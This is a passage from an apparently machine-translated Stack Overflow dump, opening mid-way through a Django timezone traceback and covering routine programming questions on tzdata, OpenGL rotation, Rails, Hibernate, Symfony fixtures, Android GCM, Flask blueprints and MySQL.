14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 443, in execute_from_command_line
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 252, in fetch_command
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 382, in execute
14:20:07 web.1      |     utility.execute()
14:20:07 worker.1   |     app_name = get_commands()[subcommand]
14:20:07 celeryd.1  |     self.fetch_command(subcommand).run_from_argv(self.argv)
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 382, in execute
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 101, in get_commands
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 252, in fetch_command
14:20:07 web.1      |     self.fetch_command(subcommand).run_from_argv(self.argv)
14:20:07 worker.1   |     apps = settings.INSTALLED_APPS
14:20:07 celeryd.1  |     app_name = get_commands()[subcommand]
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 252, in fetch_command
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 101, in get_commands
14:20:07 web.1      |     app_name = get_commands()[subcommand]
14:20:07 worker.1   |     self._setup()
14:20:07 celeryd.1  |     apps = settings.INSTALLED_APPS
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/management/__init__.py", line 101, in get_commands
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 web.1      |     apps = settings.INSTALLED_APPS
14:20:07 worker.1   |     self._wrapped = Settings(settings_module)
14:20:07 celeryd.1  |     self._setup()
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 93, in __init__
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 web.1      |     self._setup()
14:20:07 worker.1   |     mod = importlib.import_module(self.SETTINGS_MODULE)
14:20:07 celeryd.1  |     self._wrapped = Settings(settings_module)
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/importlib.py", line 35, in import_module
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 93, in __init__
14:20:07 web.1      |     self._wrapped = Settings(settings_module)
14:20:07 worker.1   |     __import__(name)
14:20:07 celeryd.1  |     mod = importlib.import_module(self.SETTINGS_MODULE)
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 93, in __init__
14:20:07 worker.1   |   File "/Users/allard/Projects/hellolily/lily/__init__.py", line 10, in <module>
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/importlib.py", line 35, in import_module
14:20:07 web.1      |     mod = importlib.import_module(self.SETTINGS_MODULE)
14:20:07 worker.1   |     from django.forms.forms import BaseForm
14:20:07 celeryd.1  |     __import__(name)
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/importlib.py", line 35, in import_module
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/forms/__init__.py", line 16, in <module>
14:20:07 celeryd.1  |   File "/Users/allard/Projects/hellolily/lily/__init__.py", line 10, in <module>
14:20:07 web.1      |     __import__(name)
14:20:07 worker.1   |     from django.forms.fields import *
14:20:07 celeryd.1  |     from django.forms.forms import BaseForm
14:20:07 web.1      |   File "/Users/allard/Projects/hellolily/lily/__init__.py", line 10, in <module>
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/forms/fields.py", line 18, in <module>
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/forms/__init__.py", line 16, in <module>
14:20:07 web.1      |     from django.forms.forms import BaseForm
14:20:07 worker.1   |     from django.core import validators
14:20:07 celeryd.1  |     from django.forms.fields import *
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/forms/__init__.py", line 16, in <module>
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/validators.py", line 17, in <module>
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/forms/fields.py", line 18, in <module>
14:20:07 web.1      |     from django.forms.fields import *
14:20:07 worker.1   |     URL_VALIDATOR_USER_AGENT = settings.URL_VALIDATOR_USER_AGENT
14:20:07 celeryd.1  |     from django.core import validators
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/forms/fields.py", line 18, in <module>
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/validators.py", line 17, in <module>
14:20:07 web.1      |     from django.core import validators
14:20:07 worker.1   |     self._setup()
14:20:07 celeryd.1  |     URL_VALIDATOR_USER_AGENT = settings.URL_VALIDATOR_USER_AGENT
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/core/validators.py", line 17, in <module>
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 web.1      |     URL_VALIDATOR_USER_AGENT = settings.URL_VALIDATOR_USER_AGENT
14:20:07 worker.1   |     self._wrapped = Settings(settings_module)
14:20:07 celeryd.1  |     self._setup()
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 93, in __init__
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 web.1      |     self._setup()
14:20:07 worker.1   |     mod = importlib.import_module(self.SETTINGS_MODULE)
14:20:07 celeryd.1  |     self._wrapped = Settings(settings_module)
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/importlib.py", line 35, in import_module
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 93, in __init__
14:20:07 web.1      |     self._wrapped = Settings(settings_module)
14:20:07 worker.1   |     __import__(name)
14:20:07 celeryd.1  |     mod = importlib.import_module(self.SETTINGS_MODULE)
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 93, in __init__
14:20:07 worker.1   |   File "/Users/allard/Projects/hellolily/lily/settings.py", line 53, in <module>
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/importlib.py", line 35, in import_module
14:20:07 web.1      |     mod = importlib.import_module(self.SETTINGS_MODULE)
14:20:07 worker.1   |     ('nl', gettext_noop('Dutch')),
14:20:07 celeryd.1  |     __import__(name)
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/importlib.py", line 35, in import_module
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/translation/__init__.py", line 75, in gettext_noop
14:20:07 celeryd.1  |   File "/Users/allard/Projects/hellolily/lily/settings.py", line 53, in <module>
14:20:07 web.1      |     __import__(name)
14:20:07 celeryd.1  |     ('nl', gettext_noop('Dutch')),
14:20:07 web.1      |   File "/Users/allard/Projects/hellolily/lily/settings.py", line 53, in <module>
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/translation/__init__.py", line 75, in gettext_noop
14:20:07 web.1      |     ('nl', gettext_noop('Dutch')),
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/translation/__init__.py", line 75, in gettext_noop
14:20:07 celeryd.1  |     return _trans.gettext_noop(message)
14:20:07 web.1      |     return _trans.gettext_noop(message)
14:20:07 worker.1   |     return _trans.gettext_noop(message)
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/translation/__init__.py", line 48, in __getattr__
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/translation/__init__.py", line 48, in __getattr__
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/translation/__init__.py", line 48, in __getattr__
14:20:07 celeryd.1  |     if settings.USE_I18N:
14:20:07 web.1      |     if settings.USE_I18N:
14:20:07 worker.1   |     if settings.USE_I18N:
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/functional.py", line 184, in inner
14:20:07 celeryd.1  |     self._setup()
14:20:07 web.1      |     self._setup()
14:20:07 worker.1   |     self._setup()
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 42, in _setup
14:20:07 celeryd.1  |     self._wrapped = Settings(settings_module)
14:20:07 web.1      |     self._wrapped = Settings(settings_module)
14:20:07 worker.1   |     self._wrapped = Settings(settings_module)
14:20:07 celeryd.1  |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 118, in __init__
14:20:07 web.1      |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 118, in __init__
14:20:07 worker.1   |   File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/conf/__init__.py", line 118, in __init__
14:20:07 celeryd.1  |     raise ValueError("Incorrect timezone setting: %s" % self.TIME_ZONE)
14:20:07 web.1      |     raise ValueError("Incorrect timezone setting: %s" % self.TIME_ZONE)
14:20:07 worker.1   |     raise ValueError("Incorrect timezone setting: %s" % self.TIME_ZONE)
14:20:07 celeryd.1  | ValueError: Incorrect timezone setting: Europe/Amsterdam
14:20:07 web.1      | ValueError: Incorrect timezone setting: Europe/Amsterdam
14:20:07 worker.1   | ValueError: Incorrect timezone setting: Europe/Amsterdam
14:20:07 worker.1   | process terminated 
```

当粘贴到 ~/.virtualenvs/env_name/lib/python2.7/site-packages/pytz/zoneinfo 中时：

```
15:31:18 celeryd.1  | [2013-03-01 15:31:18,179: WARNING/Beat] Process Beat:
15:31:18 celeryd.1  | [2013-03-01 15:31:18,180: WARNING/Beat] Traceback (most recent call last):
15:31:18 celeryd.1  | [2013-03-01 15:31:18,180: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/billiard/process.py", line 273, in _bootstrap
15:31:18 celeryd.1  | [2013-03-01 15:31:18,180: WARNING/Beat] self.run()
15:31:18 celeryd.1  | [2013-03-01 15:31:18,181: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 472, in run
15:31:18 celeryd.1  | [2013-03-01 15:31:18,181: WARNING/Beat] self.service.start(embedded_process=True)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,181: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 401, in start
15:31:18 celeryd.1  | [2013-03-01 15:31:18,181: WARNING/Beat] humanize_seconds(self.scheduler.max_interval))
15:31:18 celeryd.1  | [2013-03-01 15:31:18,182: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/kombu/utils/__init__.py", line 234, in __get__
15:31:18 celeryd.1  | [2013-03-01 15:31:18,182: WARNING/Beat] value = obj.__dict__[self.__name__] = self.__get(obj)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,182: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 439, in scheduler
15:31:18 celeryd.1  | [2013-03-01 15:31:18,182: WARNING/Beat] return self.get_scheduler()
15:31:18 celeryd.1  | [2013-03-01 15:31:18,183: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 434, in get_scheduler
15:31:18 celeryd.1  | [2013-03-01 15:31:18,183: WARNING/Beat] lazy=lazy)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,183: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/utils/imports.py", line 51, in instantiate
15:31:18 celeryd.1  | [2013-03-01 15:31:18,183: WARNING/MainProcess] celery@Allards-MacBook-Pro.local has started.
15:31:18 celeryd.1  | [2013-03-01 15:31:18,183: WARNING/Beat] return symbol_by_name(name)(*args, **kwargs)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,184: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 124, in __init__
15:31:18 celeryd.1  | [2013-03-01 15:31:18,184: WARNING/Beat] Scheduler.__init__(self, *args, **kwargs)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,184: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/celery/beat.py", line 158, in __init__
15:31:18 celeryd.1  | [2013-03-01 15:31:18,184: WARNING/Beat] self.setup_schedule()
15:31:18 celeryd.1  | [2013-03-01 15:31:18,185: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 130, in setup_schedule
15:31:18 celeryd.1  | [2013-03-01 15:31:18,185: WARNING/Beat] self.install_default_entries(self.schedule)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,185: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 216, in schedule
15:31:18 celeryd.1  | [2013-03-01 15:31:18,185: WARNING/Beat] if self.schedule_changed():
15:31:18 celeryd.1  | [2013-03-01 15:31:18,185: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/schedulers.py", line 161, in schedule_changed
15:31:18 celeryd.1  | [2013-03-01 15:31:18,186: WARNING/Beat] self._last_timestamp = now()
15:31:18 celeryd.1  | [2013-03-01 15:31:18,186: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/djcelery/utils.py", line 65, in now
15:31:18 celeryd.1  | [2013-03-01 15:31:18,186: WARNING/Beat] return timezone.localtime(timezone.now())
15:31:18 celeryd.1  | [2013-03-01 15:31:18,186: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/timezone.py", line 222, in localtime
15:31:18 celeryd.1  | [2013-03-01 15:31:18,187: WARNING/Beat] timezone = get_current_timezone()
15:31:18 celeryd.1  | [2013-03-01 15:31:18,187: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/timezone.py", line 130, in get_current_timezone
15:31:18 celeryd.1  | [2013-03-01 15:31:18,187: WARNING/Beat] return getattr(_active, "value", get_default_timezone())
15:31:18 celeryd.1  | [2013-03-01 15:31:18,187: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/django/utils/timezone.py", line 112, in get_default_timezone
15:31:18 celeryd.1  | [2013-03-01 15:31:18,188: WARNING/Beat] _localtime = pytz.timezone(settings.TIME_ZONE)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,188: WARNING/Beat] File "/Users/allard/.virtualenvs/hellolily/lib/python2.7/site-packages/pytz/__init__.py", line 185, in timezone
15:31:18 celeryd.1  | [2013-03-01 15:31:18,188: WARNING/Beat] raise UnknownTimeZoneError(zone)
15:31:18 celeryd.1  | [2013-03-01 15:31:18,188: WARNING/Beat] UnknownTimeZoneError: 'Europe/Amsterdam' 
```

因此，提供的 zoneinfo 数据似乎不正确/不完整。我从哪里获得正确的数据？

**编辑2：**

我将 Burhan Khalid 的答案标记为答案，即使对我来说它不起作用。我这样做是因为我确定我做错了什么并且答案是正确的。我如何解决这个问题只是简单地将 zoneinfo 数据从另一台 macbook 复制粘贴到这个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T13:47:09.010

似乎您的`zoneinfo`数据库已损坏。下载[最新更新](http://www.iana.org/time-zones/repository/releases/tzdata2012j.tar.gz)并将存档扩展为`/usr/share/zoneinfo/`.

要更新您的数据库，一旦您下载了需要运行的数据`zic`（区域信息编译器），并且由于您将更新系统区域文件，您需要使用以下命令运行它`sudo`：

```
tar xvzf tzdata2012j.tar.gz 
```

然后创建这个小脚本：

```
#!/bin/bash

ZONES="africa
antartica
asia
australasia
europe
northamerica
pacificnew
solar87
solar88
solar89
southamerica"

for i in $ZONES
   do zic $i
done 
```

然后`sudo ./the_script.sh`从您展开存档的目录中运行它。

# math - OpenGL - 对象局部旋转

> ID：15159037
> 
> 赞同：0
> 
> 时间：2013-03-01T13:34:11.390
> 
> 标签：math, opengl, matrix, rotation

我正在尝试制作类似的东西 - 让我们称之为使用现代 OpenGL 的飞行模拟器。我正在尝试使用偏航、俯仰和滚动来旋转我的平面对象。但似乎对象围绕全局坐标系旋转（我的意思是，如果我的对象面向矢量 (0,0,1) 滚动操作像它应该的那样工作，但是如果我将它转向面对例如 (1,0,0) 它的行为就像俯仰)

我的转换矩阵是这样计算的：

```
 transformation_matrix = perspective_projection_matrix *
                        camera_rotation_matrix *
                        camera_translation_matrix *
                        translation_matrix *
                        rotation_matrix *
                        scale_matrix; 
```

旋转矩阵是

```
rotation_matrix = rotation_z * rotation_y * rotation_x; 
```

我试图在平移之前添加局部旋转矩阵，但它看起来更糟（对象现在围绕空间中的某个点飞行，始终面向默认）

我应该怎么做才能在局部坐标系中用偏航、俯仰和滚动来旋转像典型平面这样的物体？

编辑

~~我还注意到旋转是在全局坐标系中执行的，相机位置为 (0,0,0)~~ 不是这样，我的错

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:18:53.873

The plane's orientation will ultimately be the concatenation of many discrete rotations around different axes. This is not the same as simply summing the individual rotations. They are not independent.

For example, if you pitch up 90 degrees, roll 90 degrees, and then pitch down 90 degrees, the resulting orientation will *not* be a roll of 90 degrees, but instead a *yaw* of 90 degrees.

Instead, keep a persistant matrix which represents the orientation of your plane, and then apply roll, pitch, and yaw rotations to it as appropriate.

# mysql - Rails ActiveRecord::Relation 未定义方法

> ID：15159040
> 
> 赞同：1
> 
> 时间：2013-03-01T13:34:23.617
> 
> 标签：mysql, ruby-on-rails, rails-activerecord

我有一家模范医院：

```
class Hospital < ActiveRecord::Base
  attr_accessible  :beds, :fax_no, :hospital_name, :phone_no, :district_id, :institution_type_id, :location_id, :division_id, :block_id, :hospital_type_id, :IsAdministrativeLocation, :IsTribal, :latitude, :longitude

  belongs_to:district
  belongs_to:division
  belongs_to:institution_type  
  belongs_to:hospital_type
  belongs_to:block

  has_many:hospital_reports
  has_many:health_dept_locations
  has_many:sanctioned_posts
  has_many:postings
  has_many:vw_sanctioned_working_by_hospitals
end 
```

vw_sanctioned_working_by_hospitals 的视图如下

```
mysql> desc vw_sanctioned_working_by_hospital;
+--------------------+---------------+------+-----+---------+-------+
| Field              | Type          | Null | Key | Default | Extra |
+--------------------+---------------+------+-----+---------+-------+
| hospital_id        | int(11)       | NO   |     | 0       |       |
| hospital_name      | varchar(255)  | YES  |     | NULL    |       |
| class_1_sanctioned | decimal(32,0) | NO   |     | 0       |       |
| class_1_working    | bigint(21)    | NO   |     | 0       |       |
| class_1_vacant     | decimal(33,0) | NO   |     | 0       |       |
| class_2_sanctioned | decimal(32,0) | NO   |     | 0       |       |
| class_2_working    | bigint(21)    | NO   |     | 0       |       |
| class_2_vacant     | decimal(33,0) | NO   |     | 0       |       |
+--------------------+---------------+------+-----+---------+-------+ 
```

vw_sanctioned_working_by_hospital 模型如下：

```
class VwSanctionedWorkingByHospital < ActiveRecord::Base
        self.table_name = 'vw_sanctioned_working_by_hospital'
 belongs_to:hospital
end 
```

但我得到以下错误：

```
Showing /home/akash/hrmis/beauty4/app/views/hospitals/show.html.erb where line #11 raised:

undefined method `class_1_sanctioned' for #<ActiveRecord::Relation:0xb1e5bd0>
Extracted source (around line #11):

8: <div class="span4">
9: <dl class="dl-horizontal">
10:   <dt><strong>class_1_sanctioned:</strong></dt>
11:   <dd><%= @hospital.vw_sanctioned_working_by_hospitals.class_1_sanctioned %></dd>
12: 
13:   <dt><strong>Hospital Name:</strong></dt>
14:   <dd><%= @hospital.hospital_name %></dd> 
```

我哪里错了？我读过数据库视图可以像只读表一样解释，那么问题是什么？

我的关联是正确的，一切似乎都很好，但我仍然无法呈现该`class_1_sanctioned`列。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T13:42:03.013

You have a has_many relation:

```
has_many :vw_sanctioned_working_by_hospitals 
```

This actually returns a relation and not a single object. You would need to either specify which object you want e.g.

```
@hospital.vw_sanctioned_working_by_hospitals.first.class_1_sanctioned
@hospital.vw_sanctioned_working_by_hospitals.last.class_1_sanctioned
@hospital.vw_sanctioned_working_by_hospitals[123].class_1_sanctioned 
```

Or (much more likely this is what you want) you need to iterate over the relation:

```
<% @hospital.vw_sanctioned_working_by_hospitals.each do |vw_sanctioned| %>
  <%= vw_sanctioned.class_1_sanctioned %>
<% end %> 
```

# java - 保存前未设置关系 ID

> ID：15159042
> 
> 赞同：0
> 
> 时间：2013-03-01T13:34:34.480
> 
> 标签：java, spring, hibernate

我有一个`Order`...

```
private Collection<OrderCustomField> orderCustomFields;

@OneToMany(mappedBy = "order", cascade = CascadeType.ALL)
public Collection<OrderCustomField> getOrderCustomFields() {
    return orderCustomFields;
}

@JsonProperty("CustomFields")
public void setOrderCustomFields(Collection<OrderCustomField> orderCustomFields) {
    this.orderCustomFields = orderCustomFields;
} 
```

并且`OrderCustomFields`有

```
private Order order;

@ManyToOne
@javax.persistence.JoinColumn(name = "order_id", referencedColumnName = "id", nullable = false)
public Order getOrder() {
    return order;
}

public void setOrder(Order order) {
    this.order = order;
} 
```

保存订单时未`order_id`填写。`OrderCustomField`我认为这`cascade = CascadeType.ALL`将处理填充这些值。有没有我错过的东西，或者没有像我想象的那样工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:41:08.877

当 hibernate 需要存储与数据库的双向关系并且存在冲突的信息（一方引用另一方但反之不然）时，Hibernate 依赖于关系的*拥有*方。通过在 上指定`mappedBy="order"`，`@OneToMany`您将声明多方为关系的拥有方。

如果你把它去掉，那么拥有方将是关系的一方（这是一对多关系的默认值），你会得到你想要的行为。

但是，Hibernate 建议您始终设置关系的双方。这是因为在实体进入数据库并重新加载之前，另一半不会被填充。换句话说，一旦你打开二级缓存，你就会开始遇到麻烦，因为在缓存从数据库中重新加载实体之前，订单字段将为空。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:53:26.940

在这种情况下，`@PrePresist`为我工作......

```
@PrePersist
public void beforeCreate() {
    if(created == null)
        created = new Timestamp(System.currentTimeMillis());

    for(OrderCustomField orderCustomField : getOrderCustomFields())
        orderCustomField.setOrder(this);
} 
```

# database - symfony2 的测试数据生成器和教义2

> ID：15159043
> 
> 赞同：4
> 
> 时间：2013-03-01T13:34:38.520
> 
> 标签：database, unit-testing, symfony, doctrine-orm

在我的应用程序中生成用于测试目的的数据集时，我遇到了一个常见问题。我找到了许多提供原始数据生成的工具（[http://www.webresourcesdepot.com/test-sample-data-generators/](http://www.webresourcesdepot.com/test-sample-data-generators/)），但我正在寻找更复杂的东西。

我有一个 symfony2 和学说 2 项目。实体是用适当的关系定义的——一对一、一对多、多对多。是否有任何解决方案可以提供基于这些实体的自动数据生成？也许是太多了，也许不是。感谢您的任何提示。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-03-01T13:47:34.457

你应该调查：

*   [Doctrine 数据夹具](https://github.com/doctrine/data-fixtures)- 加载夹具并允许您在每次测试运行时清除表
*   [Alice](https://github.com/nelmio/alice) - 允许您从 csv/yaml/xml/etc 加载固定装置
*   [Faker](https://github.com/fzaninotto/Faker) - 允许您通过种子生成随机数据 - 与数据夹具集成

# android - 如何停止或取消注册 GCMIntentService 服务？

> ID：15159045
> 
> 赞同：2
> 
> 时间：2013-03-01T13:34:42.873
> 
> 标签：android, service, push, google-cloud-messaging

我正在使用 GCMIntentService 接收 GCM 消息。这一切都按预期工作，但我允许用户“退出”或停止应用程序，之后不应将新消息传递到设备。

问题是，如何阻止 GCMIntentService 运行？因为在我关闭所有内容并在我的 Activity 上调用“完成”之后，GCMIntentService 仍然收到导致 NullRef 的消息。

当然，我可以做一个 if 语句来避免 nullRef，但我想完全停止 GCMIntentService，使其不再运行。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T13:57:32.203

忽略您从 GCM 收到的消息怎么样？假设您有一个布尔值确定 GCM 状态，当您关闭时，您只需忽略传入的消息。

// 参见[http://developer.android.com/reference/com/google/android/gcm/GCMRegistrar.html#unregister(android.content.Context](http://developer.android.com/reference/com/google/android/gcm/GCMRegistrar.html#unregister(android.content.Context)) `public static void unregister (Context context)` )`GCMRegistrar`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-24T10:57:58.537

如果有人正在寻找答案，我的解决方案是：
在 onDestroy 中禁用我的 GCMListener 类 Intent-Filter：

```
getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), MyGCMListenerClass.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0); 
```

并在 OnResume 重新启用：

```
getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), GCMListener.class), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP); 
```

PS 所有 GCM 消息都将被忽略，因此您以后不会收到它们。

# python - 无法使用蓝图 Flask 进行路由

> ID：15159051
> 
> 赞同：1
> 
> 时间：2013-03-01T13:34:51.733
> 
> 标签：python, flask

我按照[http://flask.pocoo.org/docs/blueprints/#blueprints](http://flask.pocoo.org/docs/blueprints/#blueprints)中的说明操作，并尝试在我创建应用程序对象的脚本之外的另一个脚本中进行路由。但我得到错误

“服务器遇到内部错误，无法完成您的请求。服务器过载或应用程序出错。”

它只是忽略了我在该脚本中所做的路由。

```
restservice = Blueprint('restservice', __name__,template_folder='templates')

@restservice.route('/')
def approot():
   render_template('timeline.html') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-03T12:02:04.093

假设您的蓝图位于名为 restservice.py 的文件中，您需要在创建应用程序对象的文件中添加这些行

```
from restservice import restservice as restModule
app.register_blueprint(restModule) 
```

# mysql - 如何使用包含子查询的 mysql 查询编写循环 bash 脚本？

> ID：15159053
> 
> 赞同：1
> 
> 时间：2013-03-01T13:34:55.290
> 
> 标签：mysql, bash, loops, select, count

所以我有这个非常丑陋（但功能强大）的多个子查询 mysql Select 命令。

```
select myt_taxon_list, count(myt_taxon_list)
from (select t1.taxon_list as myt_taxon_list, t1.query_prot_id,
             count(t1.query_prot_id) / (select count(t.id)
                                        from taxa t, stax st
                                        where t.systematics like concat('%; ', st.taxon_list, '%')
                                              and t.taxon_name not like '%thaliana%'
                                              and st.taxon_list = t1.taxon_list
                                        group by t1.taxon_list) as taxfrac
      from task1 t1
      where t1.taxon_list = 'Stramenopiles'
      group by t1.query_prot_id) myt 
where taxfrac > 0.5 
```

